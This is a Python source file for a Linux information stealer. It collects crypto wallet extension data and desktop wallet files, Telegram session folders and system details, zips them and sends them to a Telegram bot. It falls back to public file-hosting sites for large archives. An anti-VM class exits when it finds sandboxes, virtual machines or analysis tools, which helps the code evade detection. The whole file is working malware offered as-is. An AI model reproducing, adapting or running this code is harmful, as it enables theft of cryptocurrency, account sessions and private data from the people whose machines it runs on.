import os
import platform
import shutil
import subprocess
import asyncio
import sys
import psutil # type: ignore
import aiohttp # type: ignore

TOKEN = "token_bot"
CHAT_ID = "chat_id"

def error_handler(error_message: str) -> None:
    hostname = os.uname().nodename
    temp_dir = os.path.join(os.path.expanduser("~"), "/tmp", hostname)

    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    exc_message = error_message
    error_file_path = os.path.join(temp_dir, 'errors.txt')

    with open(error_file_path, 'a') as file:
        file.write(f"Message : {exc_message}\n\n")

class ListUbuntuVars:
    system_info = list()
    telegram_files = list()
    wallets_files = list()


class GetAllData:
    def __init__(self):
        self.profiles_full_path = []
        self.profiles_full_path = []
        self.home = os.path.expanduser("~")
        self.hostname = os.uname().nodename
        self.Temp = "/tmp"

    async def RunAllFonctions(self):
        taskk = [asyncio.create_task(self.list_profiles_ubuntu()),asyncio.create_task(self.kill_browsers_ubuntu()),asyncio.create_task(self.get_informations()),asyncio.create_task(self.InsideFolder()),asyncio.create_task(self.SendAllData()),]
        await asyncio.gather(*taskk)

    async def list_profiles_ubuntu(self):
        try:
            directories = {
                "Brave": os.path.join(self.home, ".config", "BraveSoftware", "Brave-Browser", "Default"),
                "Chrome": os.path.join(self.home, ".config", "google-chrome", "Default"),
                "Chromium": os.path.join(self.home, ".config", "chromium", "Default"),
                "Edge": os.path.join(self.home, ".config", "microsoft-edge", "Default"),
                "Opera": os.path.join(self.home, ".config", "opera", "Default"),
                "Vivaldi": os.path.join(self.home, ".config", "vivaldi", "Default"),
                "Yandex": os.path.join(self.home, ".config", "yandex-browser", "Default")
            }
            for name, directory in directories.items():
                if os.path.isdir(directory):
                    self.profiles_full_path.append(directory)

        except Exception as e:
            print(f"Error while listing profiles: {str(e)}")
            pass

    async def kill_browsers_ubuntu(self):
        try:
            process_names = ["chrome", "opera", "microsoft-edge", "brave", "chromium", "vivaldi", "yandex"]
            for process_name in process_names:
                kill_cmd = f"pkill {process_name}"
                process = await asyncio.create_subprocess_shell(kill_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await process.communicate()

        except Exception as e:
            print(f"Error while killing browsers: {str(e)}")
            pass

    def check_and_create_directory(self, folder_path):
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
        os.makedirs(folder_path)

    def count_wallet_folders(self, folder_path):
        wallet_folder = os.path.join(folder_path, "Wallets")
        if os.path.exists(wallet_folder):
            return len([d for d in os.listdir(wallet_folder) if os.path.isdir(os.path.join(wallet_folder, d))])
        return 0

    def count_telegram_folders(self, folder_path):
        telegram_folder = os.path.join(folder_path, "Telegram Session", "tdata")
        if os.path.exists(telegram_folder):
            return len([d for d in os.listdir(telegram_folder) if os.path.isdir(os.path.join(telegram_folder, d))])
        return 0

    async def run_command(self, command):
        try:
            result = await asyncio.create_subprocess_shell(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = await result.communicate()
            return stdout.decode().strip() if stdout else stderr.decode().strip()
        except Exception as e:
            error_handler(f"Erreur lors de l'exécution de la commande : {e}")

    async def get_informations(self) -> None:
        sys_uname = await self.run_command("uname -a")
        sys_release = await self.run_command("lsb_release -a")
        sys_hostname = await self.run_command("hostname")
        cpu_info = await self.run_command("lscpu")
        memory_info = await self.run_command("free -h")
        disk_info = await self.run_command("df -h")
        ip_address = await self.run_command("ip addr")
        ip_route = await self.run_command("ip route")
        ip_netstat = await self.run_command("netstat -tuln")
        installed_softwares = await self.run_command("dpkg --get-selections")
        process_list = await self.run_command("ps aux")
        task_list = await self.run_command("top -b -n 1")

        ListUbuntuVars.system_info.append(f"--- System Informations ---\nSystem Uname: {sys_uname}\nSystem Release: {sys_release}\nSystem Hostname: {sys_hostname}\n--- Informations CPU ---\n{cpu_info}\n--- Memory Informations ---\n{memory_info}\n--- Disk Informations ---\n{disk_info}\n--- Network Informations ---\nIP Address: {ip_address}\nIP Route: {ip_route}\nNetstat: {ip_netstat}\n--- Installed Softwares ---\n{installed_softwares}\n--- Processes Lists ---\n{process_list}\n--- Task Lists ---\n{task_list}\n"
        )

    def find_telegram_directory(self):
        telegram_base_dir = os.path.join(self.home, "snap", "telegram-desktop")
        for item in os.listdir(telegram_base_dir):
            item_path = os.path.join(telegram_base_dir, item)
            if os.path.isdir(item_path):
                try:
                    int(item)
                    return item_path
                except ValueError:
                    continue
        return None

    async def StealTelegram(self, directory_path) -> None:
        telegram_dir = self.find_telegram_directory()
        if not telegram_dir:
            error_handler("Telegram directory not found")
            return
        source_dir = os.path.join(telegram_dir, ".local", "share", "TelegramDesktop", "tdata")
        destination_dir = os.path.join(directory_path, "Telegram Session", "tdata")
        os.makedirs(destination_dir, exist_ok=True)
        exclude_list = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
        for item in os.listdir(source_dir):
            if item not in exclude_list:
                src_path = os.path.join(source_dir, item)
                dest_path = os.path.join(destination_dir, item)
                if os.path.isdir(src_path):
                    shutil.copytree(src_path, dest_path, dirs_exist_ok=True)
                else:
                    shutil.copy2(src_path, dest_path)

    async def StealWallets(self, copied_path:str) -> None:
        try:
            wallets_ext_names = {
                "Binance (Chrome)": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Binance (Edge)": "eeagobfjdenkkddmbclomhiblgggliao",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Ronin (Chrome)": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Coinbase (Chrome)": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "Coinbase (Edge)": "jbdaocneiiinmjbjlgalhcelgbejmnid",
                "MetaMask (Chrome)": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "MetaMask (Edge)": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "TrustWallet (Chrome)": "egjidjbpglichdcondbcbdnbeeppgdph",
                "TrustWallet (Edge)": "fdjamakpfbbddfjaooikfcpapjohcfmg",
                "Ronin (Edge)": "bblmcdckkhkhfhhpfcchlpalebmonecp",
            }
            
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.home, ".bitcoin", "wallets"),
                "Bytecoin": os.path.join(self.home, ".bytecoin"),
                "Coinomi": os.path.join(self.home, ".coinomi", "wallets"),
                "Atomic": os.path.join(self.home, ".config", "Atomic", "Local Storage", "leveldb"),
                "Dash": os.path.join(self.home, ".dashcore", "wallets"),
                "Exodus": os.path.join(self.home, ".config", "Exodus", "exodus.wallet"),
                "Electrum": os.path.join(self.home, ".electrum", "wallets"),
                "WalletWasabi": os.path.join(self.home, ".walletwasabi", "Client", "Wallets"),
            }

            wallet_dir = os.path.join(copied_path, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)

            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_path = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_path):
                            try:
                                file_name = f"{os.path.basename(ext_path)} {wallet_name}"
                                dest_path = os.path.join(wallet_dir, file_name)
                                shutil.copytree(wallet_path, dest_path)
                            except Exception:
                                error_handler(f"wallet extension error - {str(e)}")

            for wallet_name, wallet_path in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_path):
                        dest_path = os.path.join(wallet_dir, wallet_name)
                        shutil.copytree(wallet_path, dest_path)
                except Exception as e:
                    error_handler(f"wallet dekstop error - {str(e)}")
        except Exception as e:
            error_handler(f"wallets error - {str(e)}")


    async def InsideFolder(self):
        temp_path = os.path.join(os.path.expanduser("~"), self.Temp)
        folder_path = os.path.join(temp_path, self.hostname)
        self.check_and_create_directory(folder_path)

        await self.StealWallets(folder_path)
        await self.StealTelegram(folder_path)

        wallet_count = self.count_wallet_folders(folder_path)
        telegram_count = self.count_telegram_folders(folder_path)
        ListUbuntuVars.wallets_files.append(wallet_count)
        ListUbuntuVars.telegram_files.append(telegram_count)

        with open(os.path.join(folder_path, "system_info.txt"), "w", encoding="utf-8", errors="ignore") as file:
            for system_value in ListUbuntuVars.system_info:
                file.write(system_value)


    async def SendAllData(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.Temp, hostname)
            shutil.make_archive(filePath, "zip", filePath)
            system_info = platform.uname()

            text = f"""
<b>👤  <i><u>{hostname} - All Info</u></i></b>

<b><i><u>System Info</u></i></b>
<b>Computer Host:</b> <code>{system_info.node}</code>
<b>Computer OS:</b> <code>{system_info.system} {system_info.release} {system_info.version}</code>
<b>Total Memory:</b> <code>{system_info.machine}</code>
<b>CPU:</b> <code>{system_info.processor}</code>

<b><i><u>Stealed Files</u></i></b>
<b>Telegram:</b> <code>{str(len(ListUbuntuVars.telegram_files))}</code>
<b>Wallets:</b> <code>{str(len(ListUbuntuVars.wallets_files))}</code>
<b>System Info:</b> <code>{str(len(ListUbuntuVars.system_info))}</code>
"""

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    if response.status != 200:
                        raise Exception(f"Failed to send message: {await response.text()}")

                if os.path.getsize(filePath + ".zip") / (1024 * 1024) <= 15:
                    send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                    async with aiohttp.ClientSession() as session:
                        with open(filePath + ".zip", 'rb') as file:
                            document_payload = {
                                'chat_id': CHAT_ID,
                            }
                            files = {
                                'document': file
                            }
                            async with session.post(send_document_url, data=document_payload, files=files) as response:
                                if response.status != 200:
                                    error_handler(f"Error sending file: {await response.text()}")
                else:
                    file_url = await UploadFiles.upload_file(filePath + ".zip")
                    if file_url is not None:
                        text = f"<b>{platform.node()} - File Link</b>\n\n<b>{file_url}</b>"
                        message_payload['text'] = text
                        async with aiohttp.ClientSession() as session:
                            async with session.post(send, data=message_payload) as response:
                                if response.status != 200:
                                    raise Exception(f"Failed to send file link: {await response.text()}")
                    else:
                        text = "<b>Can't Send File Link</b>"
                        message_payload['text'] = text
                        async with aiohttp.ClientSession() as session:
                            async with session.post(send, data=message_payload) as response:
                                if response.status != 200:
                                    raise Exception(f"Failed to send error message: {await response.text()}")

                try:
                    os.remove(filePath + ".zip")
                    shutil.rmtree(filePath)
                except Exception as e:
                    error_handler(f"Failed to remove files: {str(e)}")

        except Exception as e:
            error_handler(f"SendAllData error: {str(e)}")
        

class UploadFiles:
    @staticmethod
    async def getserver() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception as e:
            error_handler(f"gofile server error - {str(e)}")
            return "store1"

    @staticmethod
    async def upload_gofile(path: str) -> str:
        try:
            server = await UploadFiles.getserver()
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                        data = await response.json()
                        if response.status == 200 and "data" in data:
                            return data["data"]["downloadPage"]
                        else:
                            return None
        except Exception as e:
            error_handler(f"gofile error - {str(e)}")
            return None

    @staticmethod
    async def upload_catbox(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
                    form.add_field('reqtype', 'fileupload')
                    form.add_field('userhash', '')
                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                        result = await response.text()
                        if "catbox.moe" in result:
                            return result
                        else:
                            return None
        except Exception as e:
            error_handler(f"catbox error - {str(e)}")
            return None

    @staticmethod
    async def upload_fileio(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://file.io/', data=form) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("link")
                        else:
                            return None
        except Exception as e:
            error_handler(f"fileio error - {str(e)}")
            return None

    @staticmethod
    async def upload_file(file_path: str) -> str:
        upload_attempts = [
            ('GoFile', UploadFiles.upload_gofile),
            ('Catbox', UploadFiles.upload_catbox),
            ('File.io', UploadFiles.upload_fileio),
        ]
        
        for platform, upload_method in upload_attempts:
            try:
                result = await upload_method(file_path)
                if result:
                    return result
            except Exception as e:
                error_handler(f"{platform} upload attempt error - {str(e)}")
                continue
        
        return "All upload attempts failed."

class anti_vm:
    async def run_all_fonctions(self) -> None:
        tasks = [
            asyncio.create_task(self.check_disk_space()),
            asyncio.create_task(self.check_recent_files()),
            asyncio.create_task(self.check_process_count()),
            asyncio.create_task(self.check_virtual_memory()),
            asyncio.create_task(self.check_for_virtualization()),
            asyncio.create_task(self.check_for_suspicious_files()),
            asyncio.create_task(self.check_system_manufacturer())
        ]
        try:
            await asyncio.gather(*tasks)
        except Exception as e:
            self.error_handler(f"send all anti vm error - {str(e)}")

    async def check_disk_space(self) -> bool:
        try:
            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
            if total_disk_space_gb < 50:
                sys.exit(0)
            min_disk_space_gb = 50
            if len(sys.argv) > 1:
                min_disk_space_gb = float(sys.argv[1])
            free_space_gb = psutil.disk_usage('/').free / 1073741824
            if free_space_gb < min_disk_space_gb:
                sys.exit(0)
        except Exception as e:
            self.error_handler(f"anti vm disk space error - {str(e)}")

    async def check_recent_files(self) -> bool:
        try:
            recent_files_folder = os.path.expanduser('~/.local/share/recently-used.xbel')
            if not os.path.exists(recent_files_folder) or os.stat(recent_files_folder).st_size == 0:
                sys.exit(0)
        except Exception as e:
            self.error_handler(f"check recent files error - {str(e)}")

    async def check_process_count(self) -> None:
        try:
            if len(psutil.pids()) < 50:
                sys.exit(0)
        except Exception as e:
            self.error_handler(f"process count error - {str(e)}")

    async def check_virtual_memory(self) -> None:
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_memory_gb < 6:
                sys.exit(0)
        except Exception as e:
            self.error_handler(f"virtual memory error - {str(e)}")

    async def check_for_virtualization(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('lspci', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            lspci_output = stdout.decode(errors='ignore').lower()
            if any(x in lspci_output for x in ("virtualbox", "vmware", "qemu")):
                sys.exit(0)
        except Exception as e:
            self.error_handler(f"virtualization error - {str(e)}")

    async def check_for_suspicious_files(self) -> None:
        try:
            temp_file_path = os.path.join('/tmp', 'suspicious_file_check')
            if os.path.exists(temp_file_path):
                sys.exit(0)

            machine_name = platform.uname().machine.lower()
            if "qemu" in machine_name:
                sys.exit(0)

            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "ida", "wireshark", "qemu-ga", "vboxservice", "vmtoolsd", "x64dbg"]
            running_processes = [
                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
                if process.name().lower() in suspicious_process_names
            ]
            if running_processes:
                sys.exit(0)
        except Exception as e:
            self.error_handler(f"sus files error - {str(e)}")

    async def check_system_manufacturer(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('cat /sys/class/dmi/id/product_name', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            manufacturer_info = stdout.decode(errors='ignore').lower()
            if "vmware" in manufacturer_info or "virtualbox" in manufacturer_info:
                sys.exit(0)
        except Exception as e:
            self.error_handler(f"manufacturer error - {str(e)}")

async def main():
    data = GetAllData()
    await data.RunAllFonctions()

if __name__ == "__main__":
    if os.name == 'posix':
        asyncio.run(main())
    else:
        print('run only on linux operating system')
